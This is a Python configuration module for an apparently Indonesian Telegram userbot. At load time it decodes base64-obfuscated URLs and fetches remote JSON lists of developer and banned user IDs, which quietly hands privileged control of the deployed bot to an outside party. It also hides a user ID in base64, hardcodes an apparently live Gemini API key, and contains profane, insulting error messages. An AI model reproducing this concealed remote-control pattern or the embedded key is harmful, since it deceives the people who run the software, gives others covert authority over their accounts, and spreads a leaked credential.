import json
import sys
from base64 import b64decode
from os import getenv

import requests
from dotenv import load_dotenv

black = int(b64decode("MTA1NDI5NTY2NA=="))

ERROR = "Maintained ? Yes Oh No Oh Yes Ngentot\n\nBot Ini Haram Buat Lo Bangsat!!\n\n@ CREDIT : NAN-DEV"
DIBAN = "LAH LU DIBAN BEGO DI @KYNANSUPPORT"


def get_devs():
    try:
        aa = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL25heWExNTAzL3dhcm5pbmcvbWFpbi9kZXZzLmpzb24="
        bb = b64decode(aa).decode("utf-8")
        res = requests.get(bb)
        if res.status_code == 200:
            return json.loads(res.text)
    except Exception as e:
        return f"An error occurred: {str(e)}"
        sys.exit(1)


def get_tolol():
    try:
        aa = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL25heWExNTAzL3dhcm5pbmcvbWFpbi90b2xvbC5qc29u"
        bb = b64decode(aa).decode("utf-8")
        res = requests.get(bb)
        if res.status_code == 200:
            return json.loads(res.text)
    except Exception as e:
        return f"An error occurred: {str(e)}"
        sys.exit(1)


def get_blgc():
    try:
        aa = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL25heWExNTAzL3dhcm5pbmcvbWFpbi9ibGdjYXN0Lmpzb24="
        bb = b64decode(aa).decode("utf-8")
        res = requests.get(bb)
        if res.status_code == 200:
            return json.loads(res.text)
    except Exception as e:
        return f"An error occurred: {str(e)}"
        sys.exit(1)


TOLOL = get_tolol()

NO_GCAST = get_blgc()

load_dotenv()

id_button = {}
CMD_HELP = {}


DEVS = get_devs()

devs_boong = list(map(int, getenv("devs_boong", "").split()))
api_id = int(
    getenv(
        "api_id",
    )
)
api_hash = getenv("api_hash", "")
bot_token = getenv("bot_token", "")
bot_id = int(getenv("bot_id", ""))
db_name = getenv("db_name", "userbot")
log_pic = getenv("log_pic", "https://itzpire.com/file/8d267cc47e5e.jpg")
def_bahasa = getenv("def_bahasa", "toxic")
owner_id = int(getenv("owner_id", "1506963557"))
the_cegers = list(map(int, getenv("the_cegers", "").split()))
dump = int(getenv("dump", ""))
bot_username = getenv("bot_username", "")
log_userbot = int(getenv("log_userbot", ""))
nama_bot = getenv("nama_bot", "ғᴇʀᴅɪ-ᴘʏʀᴏ")
gemini_api = getenv("gemini_api", "AIzaSyC28dJ5wTyjm44ng1WCuz4uTppelgRcLuU")

if owner_id not in DEVS:
    DEVS.append(owner_id)
if owner_id not in the_cegers:
    the_cegers.append(owner_id)
